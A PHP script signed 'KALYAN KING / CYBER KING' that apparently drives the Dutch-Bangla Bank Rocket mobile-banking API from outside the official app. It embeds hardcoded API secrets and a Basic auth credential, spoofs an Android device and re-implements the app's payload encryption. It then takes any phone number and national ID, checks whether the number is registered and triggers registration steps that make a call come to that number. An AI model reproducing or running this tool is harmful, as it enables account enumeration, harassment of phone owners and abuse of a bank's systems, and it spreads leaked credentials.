<?php
//___ SEND BY :> KALYAN KING 

// ___ TOOL :- রকেটের Main PHP 
header('Content-Type: application/json; charset=utf-8');

$API_PASSWORD = "sdfheu\$*sdfGw2";
$BASIC_AUTH   = "cm9ja2V0LWFwcC1lbmM6UmsjdDQwY2tFdCoj";
$BASE_URL     = "https://rocket-consumertxnservice.dutchbanglabank.com/apigw/v1";
$DEVICE_ID      = "ANDROID-01968184976";
$DEVICE_INFO    = "SP1A.210812.016-itel S665L";
$CLIENT_VERSION = "3.1.6";
$DEFAULT_NID    = "5845888855";

// ── Block non-API requests (favicon, robots.txt, etc.)
$uri = $_SERVER['REQUEST_URI'] ?? 'CLI';
$path = parse_url($uri, PHP_URL_PATH);
if ($path !== '/' && $path !== '/roct_main.php' && !str_starts_with($path, '/roct_main')) {
    http_response_code(404);
    exit;
}

//___ SEND BY :> KALlYAN KING ✔ ___ CYBER KING ✔
if (php_sapi_name() === 'cli') {
    $args = array_slice($argv, 1);
    $phone = null;
    $nid   = $DEFAULT_NID;
    foreach ($args as $arg) {
        if (strpos($arg, '=') !== false) {
            [$k, $v] = explode('=', $arg, 2);
            if ($k === 'phone') $phone = $v;
            if ($k === 'nid')   $nid   = $v;
        } else {
            if ($phone === null) $phone = $arg;
            else $nid = $arg;
        }
    }
} else {
    $phone = $_REQUEST['phone'] ?? null;
    $nid   = $_REQUEST['nid']   ?? $DEFAULT_NID;
}
// ___ TOOL :- রকেটের Main PHP
//___ SEND BY :> KALlYAN KING ✔ ___ CYBER KING ✔
if ($phone === null || $phone === '') {
    http_response_code(400);
    echo json_encode(["error" => "Phone number required"], JSON_UNESCAPED_UNICODE);
    exit;
}
if (!preg_match('/^01[0-9]{9}$/', $phone)) {
    http_response_code(400);
    echo json_encode(["error" => "Invalid phone number"], JSON_UNESCAPED_UNICODE);
    exit;
}
if ($nid === null || $nid === '') {
    http_response_code(400);
    echo json_encode(["error" => "NID required"], JSON_UNESCAPED_UNICODE);
    exit;
}
// ___ TOOL :- রকেটের Main PHP
//___ SEND BY :> KALlYAN KING ✔ ___ CYBER KING ✔
function getKey(string $salt): string {
    global $API_PASSWORD;
    return hash_pbkdf2('sha256', $API_PASSWORD, $salt, 65536, 32, true);
}

function encryptPayload(array $payload): string {
    $raw = json_encode($payload);
    $iv   = random_bytes(16);
    $salt = random_bytes(16);
    $key  = getKey($salt);
    $tag  = '';
    $ct   = openssl_encrypt($raw, 'aes-256-gcm', $key, OPENSSL_RAW_DATA, $iv, $tag, '', 16);
    return base64_encode($iv . $salt . $ct . $tag);
}

function decryptPayload(string $b64): array {
    $raw  = base64_decode($b64);
    $iv   = substr($raw, 0, 16);
    $salt = substr($raw, 16, 16);
    $ct   = substr($raw, 32);
    $key  = getKey($salt);
    $tag  = substr($ct, -16);
    $data = substr($ct, 0, -16);
    $pt   = openssl_decrypt($data, 'aes-256-gcm', $key, OPENSSL_RAW_DATA, $iv, $tag);
    if ($pt === false) throw new Exception("Decryption failed");
    return json_decode($pt, true);
}

function makeRefId(string $prefix = "login"): string {
    $now = microtime(true);
    $dt  = date('YmdHis', (int)$now);
    $ms  = str_pad((int)(fmod($now, 1) * 1000), 3, '0', STR_PAD_LEFT);
    usleep(random_int(1000, 50000));
    return "{$prefix}--{$dt}{$ms}";
}
// ___ TOOL :- রকেটের Main PHP
//___ SEND BY :> KALlYAN KING ✔ ___ CYBER KING ✔
function apiCall(string $endpoint, array $payload, ?string $token = null): array {
    global $BASE_URL, $BASIC_AUTH;

    $headers = [
        "Authorization: Basic " . $BASIC_AUTH,
        "CHANNEL_ID: ROCKET_APP_USER",
        "Content-Type: application/json; charset=utf-8",
        "Host: rocket-consumertxnservice.dutchbanglabank.com",
        "Connection: Keep-Alive",
        "Accept-Encoding: gzip",
        "User-Agent: okhttp/4.9.3",
    ];
    if ($token) $headers[0] = "Authorization: Bearer {$token}";

    $encrypted = encryptPayload($payload);
    $body = json_encode(["userData" => $encrypted]);

    $ch = curl_init("{$BASE_URL}/{$endpoint}");
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => $body,
        CURLOPT_HTTPHEADER     => $headers,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 30,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_ENCODING       => '',
    ]);
// ___ TOOL :- রকেটের Main PHP
    $resp = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $err = curl_error($ch);
    curl_close($ch);

    if ($err) throw new Exception("cURL error: {$err}");
    if ($httpCode >= 400) throw new Exception("HTTP {$httpCode}: {$resp}");

    $result = json_decode($resp, true);
    if (isset($result['userData']) && !empty($result['userData'])) {
        return decryptPayload($result['userData']);
    }
    return $result;
}

// ___ TOOL :- রকেটের Main PHP
$result = ["phone" => $phone, "nid" => $nid, "steps" => [], "success" => false];

try {
    
    $loginResp = apiCall("login", [
        "apiId" => 102, "deviceId" => $DEVICE_ID, "deviceInfo" => $DEVICE_INFO,
        "clientVersion" => $CLIENT_VERSION, "refId" => makeRefId("login"),
        "sessionId" => "123", "clientLanguage" => "EN",
        "data" => ["appType" => "C", "rocketSessionId" => "1234",
                    "userId" => $phone, "version" => $CLIENT_VERSION],
    ]);

    if (($loginResp['status'] ?? '') !== 'SUCCESS') {
        $result['steps'][] = ["step" => "login", "status" => "FAILED",
                              "message" => $loginResp['message'] ?? ''];
        echo json_encode($result, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
        exit;
    }

    $token     = $loginResp['data']['accessToken'];
    $sessionId = $loginResp['data']['sessionId'];
    $result['steps'][] = ["step" => "login", "status" => "SUCCESS"];

//___ SEND BY :> KALlYAN KING ✔ ___ CYBER KING ✔
    $svcPayload = [
        "apiId" => 3042, "deviceId" => $DEVICE_ID, "deviceInfo" => $DEVICE_INFO,
        "clientVersion" => $CLIENT_VERSION, "refId" => makeRefId("reg-init"),
        "sessionId" => $sessionId, "clientLanguage" => "EN",
        "data" => ["appType" => "C", "initiatorId" => $phone,
                    "rocketSessionId" => "7654321", "userId" => "",
                    "version" => $CLIENT_VERSION, "deviceType" => "ANDROID"],
    ];
    $userResp  = apiCall("userService", $svcPayload, $token);
    $userType  = ($userResp['data'] ?? [])['userType'] ?? '?';
    $promtUser = ($userResp['data'] ?? [])['promtUser'] ?? '';

    $result['steps'][] = ["step" => "userService", "status" => $userResp['status'] ?? '',
                          "userType" => $userType, "promtUser" => $promtUser,
                          "message" => $userResp['message'] ?? ''];

    if (($userResp['status'] ?? '') !== 'SUCCESS') {
        $result['error'] = $userResp['message'] ?? 'userService failed';
        echo json_encode($result, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
        exit;
    }

    if ($userType === 'NEW') {
        
        $nidResp = apiCall("userService", [
            "apiId" => 3002, "deviceId" => $DEVICE_ID, "deviceInfo" => $DEVICE_INFO,
            "clientVersion" => $CLIENT_VERSION, "refId" => makeRefId("nid-check"),
            "sessionId" => $sessionId, "clientLanguage" => "EN",
            "data" => ["nidNo" => $nid, "initiatorId" => $phone],
        ], $token);
        $result['steps'][] = ["step" => "nid_check", "status" => $nidResp['status'] ?? '',
                              "message" => $nidResp['message'] ?? ''];

        // Final trigger
        try {
            $finalResp = apiCall("userService", [
                "apiId" => 3034, "deviceId" => $DEVICE_ID, "deviceInfo" => $DEVICE_INFO,
                "clientVersion" => $CLIENT_VERSION, "refId" => makeRefId("reg-init"),
                "sessionId" => "123", "clientLanguage" => "EN",
                "data" => ["appType" => "C", "initiatorId" => $phone,
                            "rocketSessionId" => "7654321", "userId" => "",
                            "version" => $CLIENT_VERSION, "deviceType" => "ANDROID"],
            ], $token);
            $result['steps'][] = ["step" => "final_trigger", "status" => $finalResp['status'] ?? '',
                                  "message" => $finalResp['message'] ?? ''];
        } catch (Exception $e) {
            $result['steps'][] = ["step" => "final_trigger", "status" => "ERROR",
                                  "message" => $e->getMessage()];
        }

        if ($promtUser === 'Y') {
            $result['success'] = true;
            $result['callWillCome'] = true;
        }

    } elseif ($userType === 'OLD') {
        $result['success'] = true;
        $result['alreadyRegistered'] = true;
    }

} catch (Exception $e) {
    $result['error'] = $e->getMessage();
}

echo json_encode($result, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
